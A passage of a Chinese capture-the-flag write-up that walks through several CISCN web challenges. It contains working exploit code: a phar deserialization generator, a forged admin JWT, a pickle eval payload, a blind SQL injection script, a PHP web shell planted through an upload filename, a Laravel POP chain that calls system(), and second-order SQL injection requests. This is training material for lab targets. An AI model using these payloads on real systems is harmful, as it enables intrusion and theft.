}\n    }\n\n    ...\n    \n}\n```\n\n[关于php反序列化]([https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96](https://www.cnblogs.com/20175211lyz/p/11403397.html#六phar反序列化))在刷题记录11当中也有两篇关于phar的文章[参考文章1](https://paper.seebug.org/680/)     [参考文章2](https://xz.aliyun.com/t/2958)\n\n重点在class.php，delete.php，和download.php中\n\n在delete.php、download.php中file_exists会触发phar反序列化漏洞，但是在download.php有设置open_basedir，而delete.php中没有，所以选择delete.php\n\n编写生成phar的脚本\n\n```php\n<?php\nclass User\n{\n    public $db;\n}\n\nclass File\n{\n    public $filename;\n}\n\nclass FileList\n{\n    private $files;\n    private $results;\n    private $funcs;\n    public function __construct()\n    {\n        $file = new File();\n        $file->filename=\"/flag.txt\";\n        $this->files=array($file);\n        // TODO: Implement __destruct() method.\n    }\n}\n\n$test = new User();\n$test->db = new FileList();\n$phar = new Phar('s.phar');\n$phar->startBuffering();\n$phar->setStub(\"GIF89a __HALT_COMPILER();\");\n$phar->setMetadata($test);\n$phar->addFromString('a','a');\n$phar->stopBuffering();\n\n```\n\n将生成的s.phar改后缀为gif，上传，在删除s.gif时，抓包修改filename为`phar://s.gif`\n\n![](/pic/74.png)\n\n\n\n## 华北赛区 Day1 Web2 ikun\n\n打开题目有注册界面，先注册，登入\n\n回到首页发现要买到LV6\n\n![](/pic/75.png)\n\n在第181页找到了LV6点击购买\n\n![](/pic/76.png)\n\n抓包发现有一个价格，有一个折扣\n\n```http\nPOST /shopcar HTTP/1.1\nHost: c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 106\nOrigin: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn\nConnection: close\nReferer: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn/shopcar\nCookie: _xsrf=2|578fed8a|97f2448968d2a525b9b0490c07c3413f|1581661272; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78; commodity_id=\"2|1:0|10:1581662353|12:commodity_id|8:MTYyNA==|e3649aa3872d333d61bd8b14770c0c7ca9c0539d9263777c505ebe2ac3e7e15f\"\nUpgrade-Insecure-Requests: 1\n\n_xsrf=2%7C83e3992c%7C439e302fbcbed1836ddc3daad3af3599%7C1581661272&id=1624&price=1145141919.0&discount=0.8\n```\n\n把价格改成很小发现出错，把折扣改小出现新界面提示需要admin才能访问\n\n![](/pic/77.png)\n\n![](/pic/78.png)\n\n查看cookie，其中有一个JWT、_xsrf、commodity_id\n\n[关于JWT](https://blog.csdn.net/hekewangzi/article/details/72885670)   去jwt.io解析一下\n\n![](/pic/79.png)\n\n使用的是HS256（HMAC SHA256对称加密）算法\n\n使用c-jwt-cracker破解成功，密钥为1Kun\n\n```bash\nroot@kali:~/tools/c-jwt-cracker# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78\nSecret is \"1Kun\"\n```\n\n回到https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun\n\n![](/pic/80.png)  \n\n然后修改cookie为`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo`\n\n![](/pic/81.png)  \n\n点击页面无反应，查看源码，发现了一个WWW.ZIP\n\n![](/pic/82.png)  \n\n打开发现是tornado的框架\n\n既然PHP有序列化漏洞，python也有，通过pickle模块实现 [参考文章]（https://www.jianshu.com/p/8fd3de5b4843）\n\n在sshop/view/Admin.py中含有序列化漏洞\n\n![](/pic/83.png)\n\n```python\nimport tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))     \n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n```\n\n编写exp\n\n```python\nimport pickle\nimport urllib\n\nclass test(object):\n    def __reduce__(self):\n        return eval,(\"open('/flag.txt','r').read()\",)\nif __name__ == '__main__':\n    a = test()\n    payload = pickle.dumps(a)\n    print(urllib.quote(payload))  #c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\n    \n```\n\n在/b1g_m4mber界面点击一键成为大会员\n\n在BP中修改post中的become数据\n\n![](/pic/84.png)\n\n\n\n\n\n## 总决赛 Day2 Web1 Easyweb\n\n打开又是一个登入界面，访问robots.txt\n\n```\nUser-agent: *\nDisallow: *.php.bak\n```\n\n在登入界面登入后有一个get /image.php?id=1请求\n\n访问/image.php.bak得到源码\n\n```php\n<﻿?php\ninclude \"config.php\";\n\n$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";\n$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";\n\n$id=addslashes($id);\n$path=addslashes($path);\n\n$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);\n$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path); \n\n$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");\n$row=mysqli_fetch_array($result,MYSQLI_ASSOC);\n\n$path=\"./\" . $row[\"path\"];\nheader(\"Content-Type: image/jpeg\");\nreadfile($path);\n```\n\naddslashes() 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（*'*）、双引号（*\"*）、反斜线（*\\*）与 NUL（**`NULL`** 字符）。\n\n因为单引号被过滤，刚好又有两个变量，id后面的单引号被转义后，path后面输入的内容就会被当作语句执行，然后把path后面的单引号注释掉就不会报错了。\n\n```\n\"select * from images where id='\\' or path='$path'\"    ->\n\"select * from images where id=' or path=' $path \"\n```\n\n编写盲注脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 2/14/2020 8:39 PM\nimport requests\n\ndef str2hex(strs):\n    hexs='0x'\n    for x in range(len(strs)):\n        hexs+=hex(ord(strs[x]))[2:]\n    print(hexs)\n    return hexs\n\ndef get(payload):\n    url = 'http://48e2e973-9423-4d4e-b6ff-0e79cf4c1a5f.node3.buuoj.cn/image.php?id=\\\\0&path=or id=('+payload+')--+'\n    # print(url)\n    html = requests.get(url)\n    # print(html)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"if(ascii(substr((%s),%d,1))>%d,1,0)\" % (s_payload,x, mid)\n\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print(html,'*-*-*-*-*-*', mid)\n            if 'F'  in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tables(db):\n    db=str2hex(db)\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema='+db+')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    table = str2hex(table)\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name='+table+')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea(s_payload)\n\n\n# get_database() #ciscnfinal\n\n# get_tables('ciscnfinal') #images,users\n\nget_data('password','users') #1f97eef3ea37a28db040\n```\n\n其实直接猜表为users和栏password就好了   \n\n拿到密码然后登入，登入之后是一个文件上传，随便上传一个文件\n\n```\nI logged the file name you uploaded to logs/upload.054981d8766f246f4da3af656bbf6fe9.log.php.\n```\n\n修改文件名为\n\n```\nContent-Disposition: form-data; name=\"file\"; filename=\"<?= eval($_POST['cmd']) ?>\"\n```\n\n短标签<? ?>需要php.ini开启short_open_tag = On，但<?= ?>不受该条控制。\n\n采用js写法的标记发现不起作用。\n\n菜刀连接，flag在根目录，打开即可\n\n![](/pic/85.png)\n\n\n\n## 总决赛 Day1 Web4 Laravel1\n\n打开题目，有一段代码，还给出了源码地址，下载整个源码，进行代码审计\n\n```php\n <?php\n//backup in source.tar.gz\n\nnamespace App\\Http\\Controllers;\n\n\nclass IndexController extends Controller\n{\n    public function index(\\Illuminate\\Http\\Request $request){\n        $payload=$request->input(\"payload\");\n        if(empty($payload)){\n            highlight_file(__FILE__);\n        }else{\n            @unserialize($payload);\n        }\n    }\n} \n```\n\n直接给出了反序列化函数，接下来就是寻找POP链\n\n其中包含命名空间 [关于命名空间](https://www.runoob.com/php/php-namespace.html)\n\n先搜索__destruct，发现很多里面都是空的\n\n![](/pic/86.png)\n\n后面在`vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php`找到一个\n\n![](/pic/87.png)\n\n查看`invalidateTags`方法的定义\n\n![](/pic/88.png)\n\n其中有一个`saveDeferred`，全局搜索看看，找到了`vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php`\n\n![](/pic/89.png)\n\n接着看`dosave`，就在当前页面的下面\n\n![](/pic/90.png)\n\n此处存在动态调用可以调用到`system()`\n\n![](/pic/91.png)\n\n`$this->setInnerItem`可控，`$innerItem`是我们传入的`$item`类中的`$innerItem`属性\n\n这里可以看到有 **$item[“\\0\\*\\0expiry”]**、**$item[“\\0\\*\\0poolHash”]** 这种写法，数组键名带有 **\\0\\*\\0** 。这实际上是类中，修饰符为 **protected** 的属性，在类强转成数组之后的结果\n\n![](/pic/92.png)\n\n构造payload\n\n```php\n<?php\nnamespace Symfony\\Component\\Cache;\nclass CacheItem \n{\n\n    protected $innerItem = 'cat /flag';\n\n}\n\nnamespace Symfony\\Component\\Cache\\Adapter;\n\nclass ProxyAdapter\n{\n\tprivate $setInnerItem = 'system';\n}\n\nclass TagAwareAdapter\n{\n\tpublic $deferred = [];\n\tpublic function __construct()\n    {\n    \t$this->pool = new ProxyAdapter();\n\n    }\n}\n\n$a = new TagAwareAdapter();\n$a -> deferred = array('a' => new \\Symfony\\Component\\Cache\\CacheItem);\necho urlencode(serialize($a));  \n```\n\npayload\n\n```\n?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A8%3A%22deferred%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A4%3A%22pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A1%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D\n```\n\n![](/pic/93.png)\n\n\n\n\n\n## 华北赛区 Day1 Web5 CyberPunk\n\n是一个登入页面，查看网页源码，在最后发现了\n\n```\n<!--?file=?-->\n```\n\n可能是文件下载或者是文件包含\n\n```\npayload=/index.php?file=index.php   返回数据为空\n```\n\n尝试使用伪协议\n\n```\npayload=/index.php?file=php://filter/convert.base64-encode/resource=index.php\n```\n\n读取成功\n\n```php+HTML\n//index.php\n<?php\n\nini_set('open_basedir', '/var/www/html/');\n\n// $file = $_GET[\"file\"];\n$file = (isset($_GET['file']) ? $_GET['file'] : null);\nif (isset($file)){\n    if (preg_match(\"/phar|zip|bzip2|zlib|data|input|%00/i\",$file)) {\n        echo('no way!');\n        exit;\n    }\n    @include($file);\n}\n?>\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>index</title>\n<base href=\"./\">\n<meta charset=\"utf-8\" />\n\n<link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n<link href=\"assets/css/custom-animations.css\" rel=\"stylesheet\">\n<link href=\"assets/css/style.css\" rel=\"stylesheet\">\n\n</head>\n<body>\n<div id=\"h\">\n\t<div class=\"container\">\n        <h2>2077发售了,不来份实体典藏版吗?</h2>\n        <img class=\"logo\" src=\"./assets/img/logo-en.png\"><!--LOGOLOGOLOGOLOGO-->\n        <div class=\"row\">\n\t\t\t<div class=\"col-md-8 col-md-offset-2 centered\">\n                <h3>提交订单</h3>\n                <form role=\"form\" action=\"./confirm.php\" method=\"post\" enctype=\"application/x-www-urlencoded\">\n                    <p>\n                    <h3>姓名:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"user_name\">\n                    <h3>电话:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"phone\">\n                    <h3>地址:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"address\">\n                    </p>\n                    <button class='btn btn-lg  btn-sub btn-white' type=\"submit\">我正是送钱之人</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n<div id=\"f\">\n    <div class=\"container\">\n\t\t<div class=\"row\">\n            <h2 class=\"mb\">订单管理</h2>\n            <a href=\"./search.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要查订单</button>\n            </a>\n            <a href=\"./change.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要修改收货地址</button>\n            </a>\n            <a href=\"./delete.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我不想要了</button>\n            </a>\n\t\t</div>\n\t</div>\n</div>\n\n<script src=\"assets/js/jquery.min.js\"></script>\n<script src=\"assets/js/bootstrap.min.js\"></script>\n<script src=\"assets/js/retina-1.1.0.js\"></script>\n<script src=\"assets/js/jquery.unveilEffects.js\"></script>\n</body>\n</html>\n<!--?file=?-->\n```\n\n```php+HTML\n//search.php\n<?php\n\nrequire_once \"config.php\"; \n\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ \n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if (isset($fetch) && $fetch->num_rows>0){\n        $row = $fetch->fetch_assoc();\n        if(!$row) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"<p>姓名:\".$row['user_name'].\"</p><p>, 电话:\".$row['phone'].\"</p><p>, 地址:\".$row['address'].\"</p>\";\n    } else {\n        $msg = \"未找到订单!\";\n    }\n}else {\n    $msg = \"信息不全\";\n}\n?>\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>搜索</title>\n<base href=\"./\">\n\n<link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n<link href=\"assets/css/custom-animations.css\" rel=\"stylesheet\">\n<link href=\"assets/css/style.css\" rel=\"stylesheet\">\n\n</head>\n<body>\n<div id=\"h\">\n\t<div class=\"container\">\n\t\t<div class=\"row\">\n\t\t\t<div class=\"col-md-8 col-md-offset-2 centered\">\n                <p style=\"margin:35px 0;\"><br></p>\n                <h1>订单查询</h1>\n                <form method=\"post\">\n                    <p>\n                    <h3>姓名:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"user_name\">\n                    <h3>电话:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"phone\">\n                    </p>\n                    <p>\n                    <button class='btn btn-lg  btn-sub btn-white' type=\"submit\">查询订单</button>\n                    </p>\n                </form>\n                <?php global $msg; echo '<h2 class=\"mb\">'.$msg.'</h2>';?>\n            </div>\n        </div>\n    </div>\n</div>\n\n<div id=\"f\">\n    <div class=\"container\">\n\t\t<div class=\"row\">\n            <p style=\"margin:35px 0;\"><br></p>\n            <h2 class=\"mb\">订单管理</h2>\n            <a href=\"./index.php\">\n                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>\n            </a>\n            <a href=\"./change.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要修改收货地址</button>\n            </a> \n            <a href=\"./delete.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我不想要了</button>\n            </a>    \n\t\t</div>\n\t</div>\n</div>\n\n<script src=\"assets/js/jquery.min.js\"></script>\n<script src=\"assets/js/bootstrap.min.js\"></script>\n<script src=\"assets/js/retina-1.1.0.js\"></script>\n<script src=\"assets/js/jquery.unveilEffects.js\"></script>\n</body>\n</html>\n```\n\n```php+HTML\n//change.php\n<?php\n\nrequire_once \"config.php\";\n\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = addslashes($_POST[\"address\"]);\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if (isset($fetch) && $fetch->num_rows>0){\n        $row = $fetch->fetch_assoc();\n        $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id'];\n        $result = $db->query($sql);\n        if(!$result) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"订单修改成功\";\n    } else {\n        $msg = \"未找到订单!\";\n    }\n}else {\n    $msg = \"信息不全\";\n}\n?>\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>修改收货地址</title>\n<base href=\"./\">\n\n<link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n<link href=\"assets/css/custom-animations.css\" rel=\"stylesheet\">\n<link href=\"assets/css/style.css\" rel=\"stylesheet\">\n\n</head>\n<body>\n<div id=\"h\">\n\t<div class=\"container\">\n\t\t<div class=\"row\">\n\t\t\t<div class=\"col-md-8 col-md-offset-2 centered\">\n                <p style=\"margin:35px 0;\"><br></p>\n                <h1>修改收货地址</h1>\n                <form method=\"post\">\n                    <p>\n                    <h3>姓名:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"user_name\">\n                    <h3>电话:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"phone\">\n                    <h3>地址:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"address\">\n                    </p>\n                    <p>\n                    <button class='btn btn-lg  btn-sub btn-white' type=\"submit\">修改订单</button>\n                    </p>\n                </form>\n                <?php global $msg; echo '<h2 class=\"mb\">'.$msg.'</h2>';?>\n            </div>\n        </div>\n    </div>\n</div>\n\n<div id=\"f\">\n    <div class=\"container\">\n\t\t<div class=\"row\">\n            <p style=\"margin:35px 0;\"><br></p>\n            <h2 class=\"mb\">订单管理</h2>\n            <a href=\"./index.php\">\n                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>\n            </a>\n            <a href=\"./search.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要查订单</button>\n            </a>\n            <a href=\"./delete.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我不想要了</button>\n            </a>\n\t\t</div>\n\t</div>\n</div>\n\n<script src=\"assets/js/jquery.min.js\"></script>\n<script src=\"assets/js/bootstrap.min.js\"></script>\n<script src=\"assets/js/retina-1.1.0.js\"></script>\n<script src=\"assets/js/jquery.unveilEffects.js\"></script>\n</body>\n</html>\n```\n\n```php+HTML\n//delete.php\n<?php\n\nrequire_once \"config.php\";\n\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ \n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if (isset($fetch) && $fetch->num_rows>0){\n        $row = $fetch->fetch_assoc();\n        $result = $db->query('delete from `user` where `user_id`=' . $row[\"user_id\"]);\n        if(!$result) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"订单删除成功\";\n    } else {\n        $msg = \"未找到订单!\";\n    }\n}else {\n    $msg = \"信息不全\";\n}\n?>\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>删除订单</title>\n<base href=\"./\">\n<meta charset=\"utf-8\" />\n\n<link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n<link href=\"assets/css/custom-animations.css\" rel=\"stylesheet\">\n<link href=\"assets/css/style.css\" rel=\"stylesheet\">\n\n</head>\n<body>\n<div id=\"h\">\n\t<div class=\"container\">\n\t\t<div class=\"row\">\n\t\t\t<div class=\"col-md-8 col-md-offset-2 centered\">\n                <p style=\"margin:35px 0;\"><br></p>\n                <h1>删除订单</h1>\n                <form method=\"post\">\n                    <p>\n                    <h3>姓名:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"user_name\">\n                    <h3>电话:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"phone\">\n                    </p>\n                    <p>\n                    <button class='btn btn-lg  btn-sub btn-white' type=\"submit\">删除订单</button>\n                    </p>\n                </form>\n                <?php global $msg; echo '<h2 class=\"mb\" style=\"color:#ffffff;\">'.$msg.'</h2>';?>\n            </div>\n        </div>\n    </div>\n</div>\n<div id=\"f\">\n    <div class=\"container\">\n\t\t<div class=\"row\">\n            <h2 class=\"mb\">订单管理</h2>\n            <a href=\"./index.php\">\n                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>\n            </a>\n            <a href=\"./search.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要查订单</button>\n            </a>\n            <a href=\"./change.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要修改收货地址</button>\n            </a>\n\t\t</div>\n\t</div>\n</div>\n\n<script src=\"assets/js/jquery.min.js\"></script>\n<script src=\"assets/js/bootstrap.min.js\"></script>\n<script src=\"assets/js/retina-1.1.0.js\"></script>\n<script src=\"assets/js/jquery.unveilEffects.js\"></script>\n</body>\n</html>\n```\n\n```php+HTML\n//config.php\n<?php\n\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\n$DATABASE = array(\n\n    \"host\" => \"127.0.0.1\",\n    \"username\" => \"root\",\n    \"password\" => \"root\",\n    \"dbname\" =>\"ctfusers\"\n);\n\n$db = new mysqli($DATABASE['host'],$DATABASE['username'],$DATABASE['password'],$DATABASE['dbname']);\n```\n\n```php+HTML\n//confirm.php\n<?php\n\nrequire_once \"config.php\";\n//var_dump($_POST);\n\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = $_POST[\"address\"];\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if($fetch->num_rows>0) {\n        $msg = $user_name.\"已提交订单\";\n    }else{\n        $sql = \"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\";\n        $re = $db->prepare($sql);\n        $re->bind_param(\"sss\", $user_name, $address, $phone);\n        $re = $re->execute();\n        if(!$re) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"订单提交成功\";\n    }\n} else {\n    $msg = \"信息不全\";\n}\n?>\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>确认订单</title>\n<base href=\"./\">\n<meta charset=\"utf-8\"/>\n\n<link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n<link href=\"assets/css/custom-animations.css\" rel=\"stylesheet\">\n<link href=\"assets/css/style.css\" rel=\"stylesheet\">\n\n</head>\n<body>\n<div id=\"h\">\n\t<div class=\"container\">\n        <img class=\"logo\" src=\"./assets/img/logo-zh.png\">\n        <div class=\"row\">\n            <div class=\"col-md-8 col-md-offset-2 centered\">\n                <?php global $msg; echo '<h2 class=\"mb\">'.$msg.'</h2>';?>\n                <a href=\"./index.php\">\n                <button class='btn btn-lg  btn-sub btn-white'>返回</button>\n                </a>\n            </div>\n        </div>\n    </div>\n</div>\n\n<div id=\"f\">\n    <div class=\"container\">\n\t\t<div class=\"row\">\n            <p style=\"margin:35px 0;\"><br></p>\n            <h2 class=\"mb\">订单管理</h2>\n            <a href=\"./search.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要查订单</button>\n            </a>\n            <a href=\"./change.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要修改收货地址</button>\n            </a>\n            <a href=\"./delete.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我不想要了</button>\n            </a>\n\t\t</div>\n\t</div>\n</div>\n\n<script src=\"assets/js/jquery.min.js\"></script>\n<script src=\"assets/js/bootstrap.min.js\"></script>\n<script src=\"assets/js/retina-1.1.0.js\"></script>\n<script src=\"assets/js/jquery.unveilEffects.js\"></script>\n</body>\n</html>\n```\n\n在confirm.php、delete.php、search.php和change.phpz中存在报错注入的可能，username和phone过滤非常严格，但是address没怎么过滤，所以考虑这个参数。\n\n因为在confirm.php中在存入的过程中使用了bind_param函数，所以无法绕过。在change.php将之前存入的地址拿来出来，存在二次注入。\n\n```http\nPOST /confirm.php HTTP/1.1\nHost: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 105\nOrigin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nConnection: close\nReferer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/\nUpgrade-Insecure-Requests: 1\n\nuser_name=1&phone=1&address=1'  where user_id=(updatexml(0,concat(0,(select load_file('/flag.txt'))),0))#\n```\n\n```http\nPOST /change.php HTTP/1.1\nHost: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 29\nOrigin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nConnection: close\nReferer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/\nUpgrade-Insecure-Requests: 1\n\nuser_name=1&phone=1&address=1\n```\n\n回显数据\n\n```\nerrorXPATH syntax error: 'flag{e9485017-ebf4-4ea4-8579-daa'\n```\n\n显示不全，再逆向输出一下\n\n```http\nPOST /confirm.php HTTP/1.1\nHost: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 114\nOrigin: 